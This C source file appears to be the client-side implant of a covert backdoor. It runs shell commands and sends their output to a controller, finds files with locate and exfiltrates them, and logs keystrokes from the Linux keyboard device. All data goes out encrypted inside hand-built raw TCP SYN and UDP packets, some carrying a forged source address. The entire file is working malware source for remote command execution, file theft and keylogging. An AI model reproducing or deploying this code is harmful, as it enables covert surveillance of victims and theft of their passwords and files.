#include "functionality.h"
#include "keyNames.h"

static void processFile(char *filePath, int socket, char *buffer, struct sockaddr_in *sin);
static void sendKey(char *keyName, int socket, char *buffer, struct sockaddr_in *din);
static void whoAmI(char *buffer);
static int createRawTcpSocket();
static int createRawUdpSocket();
static char *createRawTcpPacket(struct sockaddr_in *din);
static char *createRawUdpPacket(struct sockaddr_in *din);

void executeSystemCall(char *command)
{
    int socket = 0;
    int bytesRead = 0;
    char line[4];
    char date[11];
    char *buffer = NULL;
    char *encryptedField = NULL;
    struct tm *timeStruct = NULL;
    struct sockaddr_in din;
    time_t t;
    unsigned short sum = 0;
    const unsigned short zero = 0;
    FILE *results = NULL;

    // Execute and open the pipe for reading
    results = popen(command, "r");
    
    // Make sure we have something yo
    if (results == NULL)
    {
		systemFatal("no results");
        return;
    }
    
    // Open a connection back to the client
    if ((socket = createRawTcpSocket()) == 0)
    {
		systemFatal("no raw tcpsocket");
        return;
    }
    
    // Make sure we do not receive any data
    shutdown(socket, SHUT_RD);
    
    // Get the time structs ready
    time(&t);
    timeStruct = localtime(&t);
    strftime(date, sizeof(date), "%Y:%m:%d", timeStruct);
    
    // Create the packet structure
    buffer = createRawTcpPacket(&din);
    
    // Read from the stream
    while ((bytesRead = fread(line, sizeof(char), 4, results)) > 0)
    {
        // Pad any extra space with NULL bytes
        if (bytesRead != 4)
        {
            for (; bytesRead < 4; bytesRead++)
            {
                line[bytesRead] = '\0';
            }
        }
        
        // Copy the line and encrypt it
        fprintf(stderr, "%.4s", line);
        encryptedField = encrypt_data(line, date, bytesRead);
        memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(unsigned long));
        
        // Get the checksum for the IP packet
        memcpy(buffer + 10, &zero, sizeof(unsigned short));
        sum = csum((unsigned short *)buffer, 5);
        memcpy(buffer + 10, &sum, sizeof(unsigned short));

        sendto(socket, buffer, sizeof(struct ip) + sizeof(struct tcphdr), 0,
               (struct sockaddr *)&din, sizeof(din));
        
        // Pause for a bit to allow the client to receive packets and deal with
        sleep(1);
    }
    
    // Send a FIN packet to signal end of transfer
    
    pclose(results);
    close(socket);
    free(buffer);
}

void retrieveFile(char *fileName)
{
    int socket = 0;
    char line[PATH_MAX];
    char *buffer = NULL;
    char *temp = NULL;
    struct sockaddr_in din;
    
    FILE *results = NULL;
    
    // Update the database for locate
    system("updatedb");
    
    // Combine the file name with the locate command
    snprintf(line, sizeof(line), "locate %s", fileName);
    
    // Execute and open the pipe for reading
    results = popen(line, "r");
    
    // Make sure we have something yo
    if (results == NULL)
    {
        return;
    }
    
    // Open a connection back to the client
    if ((socket = createRawTcpSocket()) == 0)
    {
        return;
    }
    
    // Make sure we do not receive any data
    shutdown(socket, SHUT_RD);
    
    // Create the packet structure
    buffer = createRawTcpPacket(&din);
    
    // This will handle multiple results from locate, client may break depending
    // on the type of file requested.
    while (fgets(line, PATH_MAX, results) != NULL)
    {
        // Remove the newline character if it exists
        if ((temp = strchr(line, '\n')) != NULL)
            *temp = '\0';
        processFile(line, socket, buffer, &din);
    }
    
    // Send a FIN packet to signal end of transfer
    
    pclose(results);
    close(socket);
    free(buffer);
}

void keylogger()
{
#ifdef __linux__
    int keyboard = 0;
    int count = 0;
    int eventSize = sizeof(struct input_event);
    int bytesRead = 0;
    int socket = 0;
    char *buffer = NULL;
    struct input_event event[64];
    struct parseKey *key = NULL;
    struct sockaddr_in din;
    
    // Create the raw socket
    if ((socket = createRawUdpSocket()) == 0)
    {
        return;
    }
    
    // Create the packet structure
    buffer = createRawUdpPacket(&din);
    
    // Open the keyboard input device for listening
    keyboard = open(KEYBOARD_DEVICE, O_RDONLY);
    if (keyboard == -1)
    {
        systemFatal("Unable to open keyboard");
        return;
    }

    // Start logging the keys
    while (1)
    {
        // Read a keypress
        bytesRead = read(keyboard, event, eventSize * 64);
        
        // Loop through the generated events
        for (count = 0; count < (bytesRead / eventSize); count++)
        {
            if (EV_KEY == event[count].type)
            {
                if ((event[count].value == KEY_PRESS) || (event[count].value == KEY_HELD))
                {
                    // Find the correct name of the keypress. This is O(n) :-(
                    for (key = keyNames; key->name != NULL; key++)
                    {
                        if (key->value == (unsigned) event[count].code)
                        {
                            // Send the key out
                            fprintf(stderr, "%s", key->name);
                            sendKey(key->name, socket, buffer, &din);
                        }
                    }
                }
            }
        }
    }
#endif
}

static void sendKey(char *keyName, int socket, char *buffer, struct sockaddr_in *din)
{
    int packetLength = 0;
    int udpLength = 0;
    int zero = 0;
    int keyLength = 0;
    char date[11];
    char *encryptedField = NULL;
    char *key = NULL;
    struct tm *timeStruct = NULL;
    unsigned short sum = 0;
    time_t t;
    
    // Get the time structs ready
    time(&t);
    timeStruct = localtime(&t);
    strftime(date, sizeof(date), "%Y:%m:%d", timeStruct);
    
    // Get our local information, add 1 for the NULL byte
    key = strndup(keyName, 31);
    keyLength = strnlen(key, 30) + 1;
    packetLength = sizeof(struct udphdr) + keyLength;
    
    // File in the UDP length
    udpLength = htons(packetLength);
    memcpy(buffer + sizeof(struct ip) + 4, &zero, sizeof(unsigned short));
    memcpy(buffer + sizeof(struct ip) + 4, &udpLength, sizeof(unsigned short));
    
    // Fill in the IP length
    packetLength += sizeof(struct ip);
    memcpy(buffer + 2, &zero, sizeof(unsigned short));
    memcpy(buffer + 2, &packetLength, sizeof(unsigned short));
    
    // Encrypt and append the keypress and a NULL byte
    encryptedField = encrypt_data(key, date, keyLength + 1);
    memcpy(buffer + sizeof(struct ip) + sizeof(struct udphdr), encryptedField, keyLength);
    
    // Calculate the IP checksum
    memcpy(buffer + 10, &zero, sizeof(unsigned short));
    sum = csum((unsigned short *)buffer, 5);
    memcpy(buffer + 10, &sum, sizeof(unsigned short));
    
    // Send the packet out
    sendto(socket, buffer, packetLength, 0, (struct sockaddr *)din, sizeof(struct sockaddr_in));
    
    // Cleanup
    free(key);
}

static void processFile(char *filePath, int socket, char *buffer, struct sockaddr_in *din)
{
    int bytesRead = 0;
    int zero = 0;
    char line[4];
    char date[11];
    char *encryptedField = NULL;
    struct tm *timeStruct = NULL;
    unsigned short sum = 0;
    time_t t;
    FILE *file = NULL;
    
    // Open the file for reading
    file = fopen(filePath, "r");
    if (file == NULL)
    {
        systemFatal("Could not find and open file");
    }
    
    // Get the time structs ready
    time(&t);
    timeStruct = localtime(&t);
    strftime(date, sizeof(date), "%Y:%m:%d", timeStruct);
    
    // Read and send the file
    while ((bytesRead = fread(line, sizeof(char), 4, file)) > 0)
    {
        // Pad any extra space with NULL bytes
        if (bytesRead != 4)
        {
            for (; bytesRead < 4; bytesRead++)
            {
                line[bytesRead] = '\0';
            }
        }
        
        // Copy the line and encrypt it
        encryptedField = encrypt_data(line, date, bytesRead);
        memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(unsigned long));
        
        // Get the checksum for the IP packet
        memcpy(buffer + 10, &zero, sizeof(unsigned short));
        sum = csum((unsigned short *)buffer, 5);
        memcpy(buffer + 10, &sum, sizeof(unsigned short));
        
        sendto(socket, buffer, sizeof(struct ip) + sizeof(struct tcphdr), 0,
               (struct sockaddr *)din, sizeof(struct sockaddr_in));
               
        // Pause for a bit to allow the client to receive packets and deal with
        sleep(1);
    }
}

static char *createRawTcpPacket(struct sockaddr_in *din)
{
    char *buffer = NULL;
    char *myAddr = NULL;
    struct ip *iph = NULL;
    struct tcphdr *tcph = NULL;
    struct sockaddr_in sin;
    
    buffer = malloc(sizeof(struct ip) + sizeof(struct tcphdr));
    myAddr = malloc(sizeof(struct in_addr));
    iph = (struct ip *) buffer;
    tcph = (struct tcphdr *) (buffer + sizeof(struct ip));
    
    // Fill out the address structs
    sin.sin_family = AF_INET;
    din->sin_family = AF_INET;
    sin.sin_port = htons(SOURCE_PORT_INT);
    din->sin_port = htons(SOURCE_PORT_INT);
    whoAmI(myAddr);
    //sin->sin_addr.s_addr = inet_addr(myAddr);
    sin.sin_addr.s_addr = inet_addr(DEST_IP);
    din->sin_addr.s_addr = inet_addr(SOURCE_IP);
    
    // Zero out the buffer
    memset(buffer, 0, sizeof(struct ip) + sizeof(struct tcphdr));
    
    // IP structure
#if defined __APPLE__ || defined __USE_BSD
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 16;
    iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->ip_id = htons(54321);
    iph->ip_off = 0;
    iph->ip_ttl = 64;
    iph->ip_p = 6;
    iph->ip_sum = 0;
    iph->ip_src = sin.sin_addr;
    iph->ip_dst = din->sin_addr;
#else
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 16;
    iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = 6;
    iph->check = 0;
    iph->saddr = sin.sin_addr;
    iph->daddr = din->sin_addr;
#endif
    
    // TCP structure
#if defined __APPLE__ || defined __FAVOR_BSD
    tcph->th_sport = htons(SOURCE_PORT_INT);
    tcph->th_dport = htons(SOURCE_PORT_INT);
    // Sequence filled in later
    tcph->th_ack = 0;
    tcph->th_off = 5;
    tcph->th_flags = TH_SYN;
    tcph->th_win = htons(32767);
    tcph->th_sum = 0;
    tcph->th_urp = 0;
#else
    tcph->source = htons(SOURCE_PORT_INT);
    tcph->dest = htons(SOURCE_PORT_INT);
    // Sequence filled in later
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(32767);
    tcph->check = 0;
    tcph->urg_ptr = 0;
#endif
    
    // Clean up memory
    free(myAddr);
    
    // This should be freed by whoever calls this function!
	return buffer;
}

static char *createRawUdpPacket(struct sockaddr_in *din)
{
    char *buffer = NULL;
    char *myAddr = NULL;
    struct ip *iph = NULL;
    struct udphdr *udph = NULL;
    struct sockaddr_in sin;
    
    buffer = malloc(sizeof(struct ip) + sizeof(struct udphdr) + 30);
    myAddr = malloc(sizeof(struct in_addr));
    iph = (struct ip *) buffer;
    udph = (struct udphdr *) (buffer + sizeof(struct ip));
    
    // Fill out the address structs
    sin.sin_family = AF_INET;
    din->sin_family = AF_INET;
    sin.sin_port = htons(SOURCE_PORT_INT);
    din->sin_port = htons(SOURCE_PORT_INT);
    whoAmI(myAddr);
    //sin->sin_addr.s_addr = inet_addr(myAddr);
    sin.sin_addr.s_addr = inet_addr(DEST_IP);
    din->sin_addr.s_addr = inet_addr(SOURCE_IP);
    
    // Zero out the buffer
    memset(buffer, 0, sizeof(struct ip) + sizeof(struct udphdr) + 30);
    
    // IP structure
#if defined __APPLE__ || defined __USE_BSD
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 16;
    // Length filled in later
    iph->ip_id = htons(54321);
    iph->ip_off = 0;
    iph->ip_ttl = 64;
    iph->ip_p = 17;
    iph->ip_sum = 0;
    iph->ip_src = sin.sin_addr;
    iph->ip_dst = din->sin_addr;
#else
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 16;
    // Length filled in later
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = 17;
    iph->check = 0;
    iph->saddr = sin.sin_addr;
    iph->daddr = din->sin_addr;
#endif
    
    // UDP structure
#if defined __APPLE__ || defined __FAVOR_BSD
    udph->uh_sport = htons(SOURCE_PORT_INT);
    udph->uh_dport = htons(SOURCE_PORT_INT);
    // Length filled in later
    udph->uh_sum = 0;
#else
    udph->source = htons(SOURCE_PORT_INT);
    udph->dest = htons(SOURCE_PORT_INT);
    // Length filled in later
    udph->check = 0;
#endif
    
    // Clean up memory
    free(myAddr);
    
    // This should be freed by whoever calls this function!
	return buffer;
}

static void whoAmI(char *buffer)
{
    struct hostent *hp;
    struct in_addr **addr;
    char hostName[PATH_MAX];
    
    if (gethostname(hostName, PATH_MAX) == -1)
    {
        systemFatal("Unable to get the host name");
    }
    
    if ((hp = gethostbyname(hostName)) == NULL)
    {
        systemFatal("Unable to get IP from host name");
    }
    
    addr = (struct in_addr **)hp->h_addr_list;
    
    strncpy(buffer, inet_ntoa(**addr), sizeof(struct in_addr));
}

static int createRawTcpSocket()
{
    int sock = 0;
    int one = 1;
    
    // Create the raw TCP socket
    sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == -1)
    {
        systemFatal("Error creating raw TCP socket");
    }
    
    // Inform the kernel do not fill up the headers' structure, we fabricated our own
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) == -1)
    {
        systemFatal("Error setting socket options");
    }
    
    return sock;
}

static int createRawUdpSocket()
{
    int sock = 0;
    int one = 1;
    
    // Create the raw UDP socket
    sock = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock == -1)
    {
        systemFatal("Error creating raw TCP socket");
    }
    
    // Inform the kernel do not fill up the headers' structure, we fabricated our own
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) == -1)
    {
        systemFatal("Error setting socket options");
    }
    
    return sock;
}
